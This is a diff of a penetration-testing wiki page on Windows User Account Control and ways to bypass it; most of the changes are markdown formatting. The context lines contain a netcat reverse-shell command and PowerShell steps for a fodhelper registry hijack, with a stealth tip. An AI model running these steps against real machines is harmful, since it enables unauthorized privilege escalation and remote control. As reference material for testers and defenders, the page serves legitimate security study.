@@ -1,6 +1,6 @@
 # UAC - User Account Control
 
-{{#include ../../banners/hacktricks-training.md}}
+\{{#include ../../banners/hacktricks-training.md\}}
 
 ## UAC
 
@@ -8,10 +8,7 @@
 
 For more info about integrity levels:
 
-
-{{#ref}}
-../windows-local-privilege-escalation/integrity-levels.md
-{{#endref}}
+\{{#ref\}} ../windows-local-privilege-escalation/integrity-levels.md \{{#endref\}}
 
 When UAC is in place, an administrator user is given 2 tokens: a standard user key, to perform regular actions as regular level, and one with the admin privileges.
 
@@ -66,12 +63,12 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
     ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
 
-- If **`0`** then, UAC won't prompt (like **disabled**)
-- If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)
-- If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
-- If **`3`** like `1` but not necessary on Secure Desktop
-- If **`4`** like `2` but not necessary on Secure Desktop
-- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges
+* If **`0`** then, UAC won't prompt (like **disabled**)
+* If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)
+* If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
+* If **`3`** like `1` but not necessary on Secure Desktop
+* If **`4`** like `2` but not necessary on Secure Desktop
+* if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges
 
 Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
 If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.
@@ -81,10 +78,10 @@ If **`0`**(default), the **built-in Administrator account can** do remote admini
 
 #### Summary
 
-- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
-- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
-- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
-- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**
+* If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
+* If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
+* If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
+* If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**
 
 All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`
 
@@ -97,8 +94,7 @@ whoami /groups | findstr Level
 
 ## UAC bypass
 
-> [!TIP]
-> Note that if you have graphical access to the victim, UAC bypass is straight forward as you can simply click on "Yes" when the UAC prompt appears
+> \[!TIP] Note that if you have graphical access to the victim, UAC bypass is straight forward as you can simply click on "Yes" when the UAC prompt appears
 
 The UAC bypass is needed in the following situation: **the UAC is activated, your process is running in a medium integrity context, and your user belongs to the administrators group**.
 
@@ -116,15 +112,14 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 
 #### UAC bypass with token duplication
 
-- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
-- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
+* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
+* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
 ### **Very** Basic UAC "bypass" (full file system access)
 
 If you have a shell with a user that is inside the Administrators group you can **mount the C$** shared via SMB (file system) local in a new disk and you will have **access to everything inside the file system** (even Administrator home folder).
 
-> [!WARNING]
-> **Looks like this trick isn't working anymore**
+> \[!WARNING] **Looks like this trick isn't working anymore**
 
 ```bash
 net use Z: \\127.0.0.1\c$
@@ -178,11 +173,13 @@ Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) pag
 The trusted binary `fodhelper.exe` is auto-elevated on modern Windows. When launched, it queries the per-user registry path below without validating the `DelegateExecute` verb. Planting a command there allows a Medium Integrity process (user is in Administrators) to spawn a High Integrity process without a UAC prompt.
 
 Registry path queried by fodhelper:
+
 ```
 HKCU\Software\Classes\ms-settings\Shell\Open\command
 ```
 
 PowerShell steps (set your payload, then trigger):
+
 ```powershell
 # Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
 C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"
@@ -203,9 +200,10 @@ Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Forc
 ```
 
 Notes:
-- Works when the current user is a member of Administrators and UAC level is default/lenient (not Always Notify with extra restrictions).
-- Use the `sysnative` path to start a 64-bit PowerShell from a 32-bit process on 64-bit Windows.
-- Payload can be any command (PowerShell, cmd, or an EXE path). Avoid prompting UIs for stealth.
+
+* Works when the current user is a member of Administrators and UAC level is default/lenient (not Always Notify with extra restrictions).
+* Use the `sysnative` path to start a 64-bit PowerShell from a 32-bit process on 64-bit Windows.
+* Payload can be any command (PowerShell, cmd, or an EXE path). Avoid prompting UIs for stealth.
 
 #### More UAC bypass
 
@@ -213,7 +211,7 @@ Notes:
 
 You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:
 
-![](<../../images/image (863).png>)
+![](<../../../.gitbook/assets/image (863).png>)
 
 (_explorer.exe_ should works)
 
@@ -243,11 +241,10 @@ If you take a look to **UACME** you will note that **most UAC bypasses abuse a D
 Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** (this is more interesting if the binary searches this information inside the **HKCU**).
 
 ## References
-- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
-- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
-- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
-- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
 
-{{#include ../../banners/hacktricks-training.md}}
+* [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
+* [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
+* [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
+* [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
 
-
+\{{#include ../../banners/hacktricks-training.md\}}
